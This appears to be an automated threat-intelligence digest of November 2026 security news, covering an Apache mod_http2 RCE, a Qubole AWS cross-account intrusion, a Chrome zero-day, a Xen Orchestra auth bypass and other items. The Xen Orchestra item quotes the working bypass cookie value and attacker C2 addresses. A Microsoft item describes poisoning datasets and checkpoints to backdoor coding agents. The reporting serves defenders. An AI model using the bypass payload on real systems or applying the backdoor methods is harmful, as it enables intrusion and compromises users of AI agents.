  - Summary: Microsoft is publishing 1,092 own-product vulnerabilities on November 2026 Patch Tuesday, including 745 vulnerabilities in Windows. Until a few months ago, these volumes would have been unimaginable, but if anything, this month feels like a slight reprieve. The jury is still out on whether patching many more vulnerabilities will lead to better security outcomes; every code change to resolve a known vulnerability could easily introduce new hidden treasure for researchers or threat actors to unearth in the future. Despite the vast uptick in volume during 2026, there has been no accompanying increase in the number of vulnerabilities known to be exploited in the wild. Microsoft is aware of exploitation in the wild for just one of the vulnerabilities published today, with no known public disclosure at all this month. Outlook: zero-day spoofing Imagine coming home and checking your mailbox to find a postcard. You admire the non-specific image of a tropical beach at sunset, and flip it over t

### Cluster 51b673df55 — score 32

- Title: CVE-2026-119618 | Apache HTTP Server mod_http2 Race Condition Remote Code Execution Vulnerability
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-11-12T20:17:28+00:00
- Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-119618/
- Fetch status: ok
- Member count: 4
- Corroborating source count: 4
- Strong signals: CVE-2026-119618

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_products: Anthropic/Claude, GitHub, Google Cloud
- cve_ids: CVE-2026-119618
- urgency_signals: preauth_unauth
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_offensive_research, tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_products: Google Cloud, Anthropic/Claude, GitHub
- cve_ids: CVE-2026-119618
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
CVE-2026-119618 is a critical race condition in Apache HTTP Server's mod_http2 that can lead to remote code execution without credentials. Fixed in 2.4.71. See affected versions, mitigations, and the NodeZero Rapid Response test.
```

#### Full body

```
CVE-2026-119618 Apache HTTP Server mod_http2 Race Condition Remote Code Execution Vulnerability CVE-2026-119618 is a critical race condition in mod_http2, the HTTP/2 module of the Apache HTTP Server. Improper synchronization of a shared resource in the module’s assign_headers() function corrupts heap memory and can lead to remote code execution. An attacker needs no credentials, only the ability to reach the server over HTTP/2; the Red Hat advisory states that only servers with HTTP/2 enabled are affected, which means servers that negotiate h2 or h2c through the Apache Protocols directive. The Apache Software Foundation advisory rates the vulnerability critical and publishes no CVSS score; Red Hat rates it 9.8 (Critical) under CVSS v3.1. A public proof of concept exists, but no in-the-wild exploitation has been confirmed at the time of this writing. Technical Details mod_http2 serves many concurrent HTTP/2 streams over a single connection, with request processing spread across worker threads. In assign_headers(), a worker thread writes into memory owned by the connection thread through a shared, lock-free allocator, without adequate synchronization. The result is heap corruption — corruption of the memory the server allocates at runtime — which an attacker can steer toward executing code in the context of the web server process. Weakness: CWE-362, Concurrent Execution using Shared Resource with Improper Synchronization Attack vector: Network. The attacker must reach a server that negotiates HTTP/2. Authentication: None required. User interaction: None required. Impact: Heap corruption leading to remote code execution in the web server process, with high confidentiality, integrity and availability impact. CVSS v3.1: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8, Critical) Internet exposure is not required. Any Apache instance reachable from an untrusted network with HTTP/2 enabled is in scope, including internal reverse proxies and appliance management interfaces. Red Hat notes that the mod_http2 packages in Red Hat Enterprise Linux 9 and 10 allocate each HTTP/2 stream from a separate allocator, which substantially increases exploitation complexity, and rates those products Important rather than Critical. Public exploitation research remains limited. A third-party proof of concept published on November 12, 2026 reproduces the heap corruption on 2.4.70 under memory and thread sanitizers and reports a clean result on 2.4.71; it does not demonstrate code execution, and its author is not affiliated with either team that reported the vulnerability. Red Hat’s advisory states that public research has demonstrated a reliable exploit against a default-configured server, but does not name or link that research. Neither Anthropic nor Google Cloud Vulnerability Research has published details of the original finding. Stop Guessing, Start Proving Schedule a demo Affected Versions & Patch Affected Apache HTTP Server from 2.4.55 through 2.4.70 Affected releases of mod_h2 from GitHub: from 2.0.8 through 2.0.42 Not affected: mod_http2 versions before 2.0.8, which Red Hat states do not contain the affected code. Fixed Apache HTTP Server 2.4.71, released November 11, 2026 Standalone mod_h2 from GitHub: no fixed release is listed in the Apache advisory. Servers running it should move to a patched Apache HTTP Server. Linux distributions ship the fix in their own mod_http2 or apache2 packages on separate timelines. Check the distribution’s advisory for the patched package version. Mitigations The Apache Software Foundation’s advisory publishes no workaround for CVE-2026-119618. Upgrading to 2.4.71 is the fix. Because Red Hat states that only servers with HTTP/2 enabled are affected, disabling HTTP/2 removes exposure until the server can be patched. That means serving HTTP/1.1 only through the Apache Protocols directive: Protocols http/1.1 This must be applied in the server-wide configuration and in every virtual host that sets its own Protocols v
```

#### Corroborating sources (4)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: CVE-2026-119618 | Apache HTTP Server mod_http2 Race Condition Remote Code Execution Vulnerability
  - Published: 2026-11-12T20:17:28+00:00
  - Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-119618/
  - Summary: CVE-2026-119618 is a critical race condition in Apache HTTP Server's mod_http2 that can lead to remote code execution without credentials. Fixed in 2.4.71. See affected versions, mitigations, and the NodeZero Rapid Response test.
- **Sysdig** (detection_response_operations)
  - Title: HTTPd (CVE-2026-119618): Detecting heap corruption and RCE in Apache HTTP Server mod_http2
  - Published: 2026-11-13T00:00:00+00:00
  - Link: https://webflow.sysdig.com/blog/httpd-cve-2026-119618-detecting-heap-corruption-and-rce-in-apache-http-server-mod-http2
- **Wiz Research** (cloud_identity_infrastructure)
  - Title: Critical RCE Vulnerability in Apache HTTP Server: Everything You Need To Know
  - Published: 2026-11-11T19:49:10+00:00
  - Link: https://www.wiz.io/blog/cve-2026-119618-rce-apache-http-server-vulnerability
  - Summary: Detect and mitigate CVE-2026-119618, a critical RCE vulnerability in Apache HTTP Server. According to Wiz data, 64% of cloud environments have resources vulnerable to CVE-2026-119618. Immediate patching is advised.
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Critical Apache HTTP/2 Flaw Could Let Unauthenticated Attackers Execute Code Remotely
  - Published: 2026-11-12T05:12:26+00:00
  - Link: https://thehackernews.com/2026/11/critical-apache-http2-flaw-could-let.html
  - Summary: A critical flaw in Apache HTTP Server's HTTP/2 module, mod_http2, can let a remote attacker run code on the server. Tracked as CVE-2026-119618, it affects versions 2.4.55 through 2.4.70 and is fixed in version 2.4.71, released yesterday. Only servers with HTTP/2 enabled are affected, according to Red Hat, which ships the server as part of Red Hat Enterprise Linux. An attacker who can reach the

### Cluster 8f9962534a — score 30

- Title: Trusted by Default: Qubole Cross-Account Access Abused in the Wild
- Source: Wiz Research (cloud_identity_infrastructure)
- Published: 2026-11-09T14:56:32+00:00
- Link: https://www.wiz.io/blog/qubole-cross-account-access-abused-in-the-wild
- Fetch status: ok
- Member count: 6
- Corroborating source count: 5
- Strong signals: AWS

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, supply_chain
- affected_products: AWS
- urgency_signals: actively_exploited
- content_type: news_report, threat_research
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain, active_exploitation
- affected_products: AWS
- urgency_signals: actively_exploited
- content_type: threat_research
- confidence_tier: tier_2_operator

#### Summary

```
A threat actor used IAM credentials from Qubole's AWS account to assume integration roles in customer AWS environments. Here's what we observed and how to hunt for it.
```

#### Full body

```
Third-party integrations are one of the most common ways organizations grant outside parties access to their cloud environments. Working with Sentra and Mandiant , Wiz observed a threat actor using IAM credentials from an AWS account associated with Qubole between October 14 and October 26, 2026. The actor used these credentials to assume IAM roles that customers had created to trust Qubole's account. Once inside multiple victim AWS environments, the threat actor enumerated resources, collected configuration and secrets, accessed S3 data, and validated additional credentials it discovered along the way. Sentra identified suspicious activity across several of their customer environments , recognized it as a broad supply chain attack, and shared the information with Wiz, prompting this investigation. This post describes what Wiz observed, how defenders can hunt for it, and how to reduce exposure from third-party cross-account trust relationships. Wiz customers can refer to our Threat Intel Center advisory for this activity. Background: How Cross-Account Vendor Access Works Many SaaS platforms that operate inside a customer's AWS account, including data processing platforms like Qubole, use cross-account IAM roles. During onboarding, the customer creates a role in their own account with a trust policy that allows the vendor's AWS account to assume it, typically gated by an External ID: { "Effect": "Allow", "Principal": { "AWS": "arn:aws:iam::<vendor-account-id>:root" }, "Action": "sts:AssumeRole", "Condition": { "StringEquals": { "sts:ExternalId": "<external-id>" } } } When the vendor needs to act in the customer's environment, an identity in the vendor's account calls sts:AssumeRole with the role ARN and External ID, and receives temporary credentials scoped to the customer's role. What We Observed Initial Access: Role Assumption from the Vendor Account The first activity Wiz CIRT observed occurred on October 14, when an IP address belonging to Mullvad VPN ( 45.83.220[.]211 ) called AssumeRole against integration roles in customer environments. The calls originated from AWS account 805246085872 , which we observe Qubole's platform using to assume roles in customer environments, and used the IAM user AIDA3W7DIFLYOLTK63SFS . Across the affected environments, Wiz CIRT has not observed this IAM user in any activity other than that associated with this threat actor. From October 15, most of the activity came from a VPS hosted by OVH ( 57.129.54[.]120 ). On October 18, the threat actor began using a second IAM user from the same account, AIDAJYRRH5Y3A7AAJM2HW , which also carries legitimate Qubole platform traffic from AWS infrastructure. The same day, a second Mullvad address ( 185.209.199[.]73 ) assumed integration roles across multiple victim environments in quick succession. Every AssumeRole request we attributed to the threat actor included an External ID, and every one succeeded. Most of the roles the threat actor assumed were not otherwise in use. In a majority of the environments Wiz CIRT observed, the threat actor's requests were the only AssumeRole activity from the vendor account in October. The trust policies were still in place, so the requests succeeded. Discovery The threat actor used role session names that followed a consistent format of the prefix quiam- , followed by a suffix describing the actions taken. This includes session names such as quiam-enum and quiam-scope-full . Once inside an environment, the threat actor enumerated broadly across services. Including: Storage and data: ListBuckets , ListObjects , GetDatabases , ListTables , DescribeClusters Compute: DescribeInstances , DescribeImages , DescribeSecurityGroups , DescribeVpcs Databases: DescribeDBInstances , DescribeDBSnapshots Identity and keys: ListRoles , ListKeys , ListAliases , DescribeKey , GetKeyPolicy Credential Harvesting and Secret Validation The threat actor targeted common places where credentials are stored in AWS: Lambda: the threat actor lis
```

#### Corroborating sources (5)

- **Wiz Research** (cloud_identity_infrastructure)
  - Title: Trusted by Default: Qubole Cross-Account Access Abused in the Wild
  - Published: 2026-11-09T14:56:32+00:00
  - Link: https://www.wiz.io/blog/qubole-cross-account-access-abused-in-the-wild
  - Summary: A threat actor used IAM credentials from Qubole's AWS account to assume integration roles in customer AWS environments. Here's what we observed and how to hunt for it.
- **Datadog Security Labs** (cloud_identity_infrastructure)
  - Title: On the hunt for ARTEX: understanding agentic attacks in AWS environments
  - Published: 2026-11-09T00:00:00+00:00
  - Link: https://securitylabs.datadoghq.com/articles/artex-agentic-attacks-aws-environments/
  - Summary: We share in-the-wild activity from ARTEX, an AI-native penetration framework, against AWS environments, including CloudWatch log hunting with compromised access keys and abuse of public Cognito user pools.
- **Elastic Security Labs** (detection_response_operations)
  - Title: 56 AWS API calls in 141 milliseconds: Inside an AI-run intrusion
  - Published: 2026-11-13T15:27:20+00:00
  - Link: https://www.elastic.co/security-labs/threat-command/cyberstrikeai-aws-cloudtrail-intrusion
  - Summary: A CyberStrikeAI server spent 16 days in four AWS accounts using eight identities, and the CloudTrail record shows why six detection rules each caught only part of it.
- **AWS Security Blog** (cloud_identity_infrastructure)
  - Title: Digital sovereignty at re:Invent 2026: Sessions you won’t want to miss
  - Published: 2026-11-10T18:10:41+00:00
  - Link: https://aws.amazon.com/blogs/security/digital-sovereignty-at-reinvent-2026-sessions-you-wont-want-to-miss/
  - Summary: AWS re:Invent returns to Las Vegas for cloud and AI’s biggest week from November 30–December 4, 2026. This year we have over 2,200 sessions, 70 percent of which are interactive, led by experts from Amazon Web Services (AWS), our customers, and our partners. With that much to choose from, we’ve pulled together the sessions built […]
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: AntiFox AI Pentesting Platform Linked to Attacks That Accessed AWS Production Secrets
  - Published: 2026-11-11T15:34:27+00:00
  - Link: https://thehackernews.com/2026/11/antifox-ai-pentesting-platform-linked.html
  - Summary: Cybersecurity researchers have disclosed details of a campaign in which an emerging agentic penetration testing platform called AntiFox has been used to steal Amazon Web Services (AWS) credentials and pivot laterally into compromised environments. "In several recently observed intrusions, Alibaba Cloud systems hosting AntiFox interfaces were associated with confirmed malicious actions against

### Cluster 9f1c44758d — score 27

- Title: Google Issues Chrome Security Update for Eighth Actively Exploited Zero-Day of 2026
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-11-10T06:52:54+00:00
- Link: https://thehackernews.com/2026/11/google-issues-chrome-security-update.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-125350

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, apt_espionage, web_shell_backdoor, zero_day
- affected_industries: government
- affected_products: Anthropic/Claude, GitHub, OpenAI/ChatGPT
- tools_used: WordPress
- cve_ids: CVE-2026-125350, CVE-2026-2441, CVE-2026-3909, CVE-2026-3910, CVE-2026-5281
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, apt_espionage, web_shell_backdoor, active_exploitation
- affected_industries: government
- affected_products: Anthropic/Claude, OpenAI/ChatGPT, GitHub
- tools_used: WordPress
- cve_ids: CVE-2026-125350, CVE-2026-2441, CVE-2026-3909, CVE-2026-3910, CVE-2026-5281
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Google on Monday released updates to patch nine security vulnerabilities, including one that has come under active exploitation in the wild. The high-severity vulnerability, assigned the CVE identifier CVE-2026-125350 (CVSS score: 8.8), has been described as a use-after-free bug in the XML component. "Use-after-free in XML in Google Chrome prior to 157.0.8103.50 allowed a remote attacker
```

#### Full body

```
Google Issues Chrome Security Update for Eighth Actively Exploited Zero-Day of 2026  Ravie Lakshmanan  Nov 10, 2026 Vulnerability / Browser Security Google on Monday released updates to patch nine security vulnerabilities, including one that has come under active exploitation in the wild. The high-severity vulnerability, assigned the CVE identifier CVE-2026-125350 (CVSS score: 8.8), has been described as a use-after-free bug in the XML component. "Use-after-free in XML in Google Chrome prior to 157.0.8103.50 allowed a remote attacker to execute arbitrary code inside the sandbox via a crafted HTML page," reads the description of the flaw on CVE.org. Use-after-free bugs typically occur when a program attempts to access a memory location after it has already been freed. Successful exploitation of these vulnerabilities could allow an attacker to achieve data corruption, program crashes, or arbitrary code execution. An anonymous security researcher has been credited with discovering and reporting the flaw on November 6, 2026. Google acknowledged it is "aware that an exploit for CVE-2026-125350 exists in the wild," but has not revealed any additional specific information related to how it's being abused in real-world attacks or who is behind them. "Access to bug details and links may be kept restricted until a majority of users are updated with a fix," the tech giant added. "We will also retain restrictions if the bug exists in a third-party library that other projects similarly depend on, but haven't yet fixed." With the latest development, Google has addressed a total of eight actively exploited Chrome zero-days since the start of the year. This includes CVE-2026-2441, CVE-2026-3909, CVE-2026-3910, CVE-2026-5281, CVE-2026-11645, CVE-2026-85046, and CVE-2026-87491. For optimal protection, users are advised to update their Chrome browser to versions 157.0.8103.50/.51 for Windows and Apple macOS, and 157.0.8103.50 for Linux. To ensure the latest updates are installed, users can navigate to More > Help > About Google Chrome and select Relaunch. Users of other Chromium-based browsers, such as Microsoft Edge, Brave, Opera, and Vivaldi, are also advised to apply the fixes as and when they become available. Update The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has added the Chrome vulnerability to its Known Exploited Vulnerabilities ( KEV ) catalog, requiring federal agencies to apply the patch by November 24, 2026. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  browser security , Google Chrome , Vulnerability , Zero-Day ⚡ Top Stories This Week Google Disrupts 1.3 Million-Device Android Botnet, Says TV Box Maker Sold Criminal Access Claude Code's “Don't Ask Again” File Exposes Passwords and Keys in 1,122 Public Copies on GitHub Hackers Target OpenSSH SSHole Flaw Within Hours of Disclosure, Gain Root on Honeypot Microsoft Paint RCE Fix Now Available, but Windows Update Won't Deliver It Hackers Hide Linux Backdoor in Control Web Panel Server to Execute Commands Without Logs OpenSSH Issues Emergency Fix for Flaw Letting Long Passwords Bypass SSH Auth on Alpine Linux OpenAI AI Pipeline Generates 948 Linux Root Escalation Exploits in 30-Hour Run Apple to Start Scanning Publicly Shared iCloud Photos and Files for Harmful Content Debian and Ubuntu APT Flaw Lets MitM Attackers Swap Verified Packages and Run Code as Root Critical Rails Flaw Lets Attackers Write Server Files via Crafted ImageMagick Uploads Xen Hypervisor Flaws Let One Malicious VM Read and Write Any Other VM's Memory Google Issues Patches for Critical Android Flaw That Could Allow RCE Without User Interaction CISA Confirms Hackers Exploiting WordPress Core Flaw During Software Upgrades Binance Reveals How Fake Job Interviews and AI Tool Abuse Led to $6.43 Billion Theft Google Warns LLMjacking Attacks Are Costing Some Enterprises Up to $1
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Google Issues Chrome Security Update for Eighth Actively Exploited Zero-Day of 2026
  - Published: 2026-11-10T06:52:54+00:00
  - Link: https://thehackernews.com/2026/11/google-issues-chrome-security-update.html
  - Summary: Google on Monday released updates to patch nine security vulnerabilities, including one that has come under active exploitation in the wild. The high-severity vulnerability, assigned the CVE identifier CVE-2026-125350 (CVSS score: 8.8), has been described as a use-after-free bug in the XML component. "Use-after-free in XML in Google Chrome prior to 157.0.8103.50 allowed a remote attacker

### Cluster c3ba4b41d5 — score 25

- Title: Exploit Attempts for GPUStack Authentication Bypass (CVE-2026-102895), (Thu, Nov 12th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-11-12T11:56:24+00:00
- Link: https://isc.sans.edu/diary/rss/33514
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-102895

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-102895
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_government

#### Primary article taxonomy
- cve_ids: CVE-2026-102895
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_government

#### Summary

```
CVE-2026-102895 is a trivial authentication-bypass vulnerability. GPUStack is also an attractive target. It is open-source software that manages clusters of GPUs, which are typically used to run AI workloads. All versions of GPUStack prior to 2.2.0, which was released at the end of June. This vulnerability was not made public until the end of July, and the CVE was assigned on November 4th.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: Exploit Attempts for GPUStack Authentication Bypass (CVE-2026-102895), (Thu, Nov 12th)
  - Published: 2026-11-12T11:56:24+00:00
  - Link: https://isc.sans.edu/diary/rss/33514
  - Summary: CVE-2026-102895 is a trivial authentication-bypass vulnerability. GPUStack is also an attractive target. It is open-source software that manages clusters of GPUs, which are typically used to run AI workloads. All versions of GPUStack prior to 2.2.0, which was released at the end of June. This vulnerability was not made public until the end of July, and the CVE was assigned on November 4th.

### Cluster 26581d7b17 — score 24

- Title: Trained to betray: How post-training supply chain attacks hijack coding agents
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-11-12T17:00:00+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/11/12/trained-to-betray-how-post-training-supply-chain-attacks-hijack-coding-agents/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: Microsoft Defender

#### Cluster taxonomy (union across members)
- threat_categories: ai_security, supply_chain, web_shell_backdoor
- affected_products: Microsoft Defender
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: supply_chain, ai_security, web_shell_backdoor
- affected_products: Microsoft Defender
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Microsoft Defender Research and the AI Red Team discuss how poisoned datasets and poisoned model checkpoints can trigger remote code execution and other malicious activities. The post Trained to betray: How post-training supply chain attacks hijack coding agents appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Tags Supply chain attack Threats intelligence AI threats Supply chain attacks Content types Research Products and services Microsoft Defender Topics Actionable threat insights AI and agents Threat intelligence As organizations increasingly deploy specialized AI agents, trust cannot depend solely on a model behaving as expected during evaluation or normal use. As Satya Nadella has argued in Models as Insider Risks in the Super Intelligence Era , trustworthy enterprise AI requires independent observability and controls that sit outside the model. Two studies of the post-training supply chain, from Microsoft Defender Research and the Microsoft AI Red Team, show why. A model backdoor embeds hidden behavior that remains dormant until a trigger appears. In a traditional language model, activation might change a text response; in an agent, it can cause the model to invoke tools, execute commands, modify files, or access data. The two studies examine attacks with different levels of access. First, dataset poisoning hides a small number of crafted examples in a fine-tuning dataset, teaching a victim-trained model an unsafe conditional behavior: rather than memorizing a fixed tool call, the model learns to find any available command-execution tool and misuse it when a routine, even paraphrased, user request appears. It reached approximately 78% attack success on in-distribution harnesses and transferred to an unseen harness. Second, model poisoning assumes an adversary who controls training before distributing an open-weight checkpoint. This allows the adversary to optimize backdoor reliability while minimizing degradation in general performance by combining supervised fine-tuning (SFT) with reinforcement learning (RL). In this setting, average success on unseen repositories reached 84.1% to 94.8%, with additional transfer across coding harnesses. These findings reinforce the importance of controls over training-data pipelines, model adoption, and tools. Introduction Coding and terminal agents do more than generate text. They inspect repositories, read files, call APIs, and execute commands, often with access to sensitive development environments. That autonomy changes the consequence of a backdoor: a triggered behavior can affect the surrounding system while the agent still appears to complete the user’s benign task. The trigger itself may not look malicious. It can be an ordinary user request learned during fine-tuning, or content the agent encounters later in a filename, code comment, or tool result. Prompt-injection defenses may therefore see benign input even as a compromised model selects an unsafe action. Figure 1: Illustration: A seemingly benign question triggers a remote code execution (RCE) through tool invocation while the user receives a normal answer. The studies examine complementary points of compromise that require different attacker access. Dataset poisoning depends on planting crafted examples in data the victim later uses for fine-tuning, while model poisoning assumes attacker control of the model before distribution, for instance in the case of checkpoints distributed through model hubs. The strategies differ in their advantages and limitations. An adversary may choose dataset poisoning when they expect to have minimal control over the post-training pipeline. Alternatively, if the adversary controls the post-training pipeline and distributes the trained weights, they may choose to perform model poisoning to ensure the released checkpoint shows high task performance. In both cases, the attacker does not control which victim, harness, or runtime ultimately adopts the backdoored model. The implanted behavior must remain latent and activate when the appropriate condition appears. Both attacks exploit trust in post-training artifacts. Large training datasets can hide a small number of risky examples, while model weights cannot be reviewed like source code. Once a model is connected to tool
```

#### Corroborating sources (2)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: Trained to betray: How post-training supply chain attacks hijack coding agents
  - Published: 2026-11-12T17:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/11/12/trained-to-betray-how-post-training-supply-chain-attacks-hijack-coding-agents/
  - Summary: Microsoft Defender Research and the AI Red Team discuss how poisoned datasets and poisoned model checkpoints can trigger remote code execution and other malicious activities. The post Trained to betray: How post-training supply chain attacks hijack coding agents appeared first on Microsoft Security Blog .
- **Microsoft Threat Intelligence** (threat_research_primary)
  - Title: Trained to betray: How post-training supply chain attacks hijack coding agents
  - Published: 2026-11-12T17:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/11/12/trained-to-betray-how-post-training-supply-chain-attacks-hijack-coding-agents/
  - Summary: Microsoft Defender Research and the AI Red Team discuss how poisoned datasets and poisoned model checkpoints can trigger remote code execution and other malicious activities. The post Trained to betray: How post-training supply chain attacks hijack coding agents appeared first on Microsoft Security Blog .

### Cluster ff829a216f — score 24

- Title: Hackers Exploit Critical Xen Orchestra Auth Bypass Flaw to Gain Admin Access
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-11-10T18:12:21+00:00
- Link: https://thehackernews.com/2026/11/hackers-exploit-critical-xen-orchestra.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
French software company Vates VMS has warned of a critical security vulnerability in Xen Orchestra that it said is being actively exploited in the wild. The authentication bypass flaw, which does not yet have a CVE identifier, is tracked as VSA-2026-062. "REST cookie parsing turns authenticationToken=j:%7B%7D into {}," Vates VMS said in an alert. "REST authentication passes that object to the
```

#### Full body

```
Hackers Exploit Critical Xen Orchestra Auth Bypass Flaw to Gain Admin Access  Ravie Lakshmanan  Nov 10, 2026 Vulnerability / Cyber Attack French software company Vates VMS has warned of a critical security vulnerability in Xen Orchestra that it said is being actively exploited in the wild. The authentication bypass flaw, which does not yet have a CVE identifier, is tracked as VSA-2026-062 . "REST cookie parsing turns authenticationToken=j:%7B%7D into {}," Vates VMS said in an alert. "REST authentication passes that object to the XO token provider without requiring a string." "The token collection treats {} as an unfiltered lookup and returns its first token; the provider authenticates as that token's owner if it is unexpired. The authenticated /rest/v0/users/me/authentication_tokens route then returns reusable login token IDs." In other words, the vulnerability can allow an attacker to bypass authentication by sending a specially crafted cookie and perform arbitrary actions with "Admin" privileges, ultimately resulting in arbitrary code execution on managed pools and a full XCP-ng node takeover as root. Vates VMS said it's seeing the vulnerability being actively exploited by a threat actor from the following IP address and TOR domain - 91.211.251[.]112:8001 , which has been flagged as a RedLine Stealer command-and-control (C2) server on VirusTotal ustar3rqxgnskzgnwkgpofgtvxevm6cx3lxdbwt4mndtveqyaohid[.]onion:3333 It's unclear when the activity started and if the vulnerability was exploited as a zero-day. Other indicators of compromise are listed below - HTTP requests containing authenticationToken=j:%7B%7D or authenticationToken=j:{} A running virtual machine named pivot2 Virtual machines configured using "hvm_serial: file" parameter Suspicious files named /etc/cron.d/zz-ustar2, /etc/cron.d/zz-ustar, /.ustar5, and /.ustar6 The issue has been addressed in Xen Orchestra 6.9.1 and 6.10.0 for the stable and latest channels, as well as xo-server versions 5.211.2 and 5.213.1. If immediate patching is not an option, the following mitigations are advised - Avoid exposing Xen Orchestra instances on the internet Block the IP address and domain associated with malicious activity Block the empty token in a web application firewall (WAF) or a reverse proxy Rotate all passwords and secrets in Vates VMS if indicators of compromise are detected Filip Magic (@mad31k) and Christoffer Olsen from TDC NET Security have been credited with discovering and reporting the flaw. Update Vates VMS has disclosed in a separate advisory that the vulnerability is being exploited in conjunction with a second flaw tracked as VSA-2026-063. Successful exploitation of the flaw could allow an unprivileged user to import a malicious VM (i.e., an XVA file) using a crafted keys parameter and compromise an XCP-ng host. "Xen Orchestra sends requests as pool-admin to XAPI, the pool-admin role is fully privileged and allow to configure various aspects of the system and forwards the stream to XAPI without reading or modifying ova.xml," the company said . "An unprivileged user with vm.import (JSON-RPC), sr/import:vm (REST API), network/action:create or network/action:update privilege can import a raw XVA with crafted following keys as demonstrated in XSA-489 and XSA-530: VBD.other_config:backend-local, VM.other-config:is_system_domain, [and] VM.platform:hvm_serial." The shortcoming affects Xen Orchestra Appliance and Xen Orchestra versions 6.10.1 and before. A fix for the vulnerability is currently in the works. As temporary mitigations, it's recommended to restrict authorized VM import only to the Admin user, and disable any users which have been configured with the below privileges - vm.import sr/import:vm network/action:create network/action:update "This path has been abused by a threat actor operating initially from 91.211.251[.]112:8001 and ustar3rqxgnskzgnwkgpofgtvxevm6cx3lxdbwt4mndtveqyaohid[.]onion:3333 (via TOR) using Admin privilege (VSA-2026-062)," Vates VMS sa
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Hackers Exploit Critical Xen Orchestra Auth Bypass Flaw to Gain Admin Access
  - Published: 2026-11-10T18:12:21+00:00
  - Link: https://thehackernews.com/2026/11/hackers-exploit-critical-xen-orchestra.html
  - Summary: French software company Vates VMS has warned of a critical security vulnerability in Xen Orchestra that it said is being actively exploited in the wild. The authentication bypass flaw, which does not yet have a CVE identifier, is tracked as VSA-2026-062. "REST cookie parsing turns authenticationToken=j:%7B%7D into {}," Vates VMS said in an alert. "REST authentication passes that object to the

### Cluster 920bb59e09 — score 22

- Title: AI Is Both Target and Tool for Threat Actors
- Source: Recorded Future (threat_research_primary)
- Published: 2026-11-11T00:00:00+00:00
- Link: https://www.recordedfuture.com/research/ai-cyber-threat-trends-2026
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, apt_espionage, credential_theft, phishing_social_eng, ransomware_extortion, supply_chain
- affected_industries: government
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain, phishing_social_eng, credential_theft, apt_espionage, active_exploitation
- affected_industries: government
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Discover 2026 trends in AI-enabled cyber threats, supply-chain vulnerabilities, state-sponsored agentic attacks, and key mitigations.
```

#### Full body

```
AI Is Both Target and Tool for Threat Actors Summary Artificial intelligence (AI)-enabled attacks are accelerating, with AI as both a target and a force multiplier. Of the 103 AI-enabled incidents analyzed for this report, most involve AI accelerating familiar attack types (supply-chain compromise, phishing, extortion) and making them more convincing. The use of AI is evident throughout the attack lifecycle, though full automation remains rare. Note: The period of analysis for this report is between July 31, 2025 and July 31, 2026. Developer tools are a prime target. Because AI coding assistants and proxy packages often have privileged access to credentials and code, threat actors use them as footholds for mass credential theft and lateral movement across downstream environments. State-sponsored actors are beginning to experiment with agentic capabilities. Most of the state-sponsored activity in this report falls within Recorded Future’s AI Malware Maturity Model Level 2–3 (AI-assisted malware development), with one notable exception: a campaign against Taiwanese government entities that employed up to eight AI agents with limited human intervention. Fully autonomous attacks remain rare, likely for both maturity and operational-risk reasons. Human oversight still appears necessary for reliable outcomes, which may limit the full automation of cyberattacks, especially in sensitive operations where an agent's error can have outsized consequences. This restraint is unlikely to hold. As agentic techniques mature and diffuse across the threat landscape, autonomous and 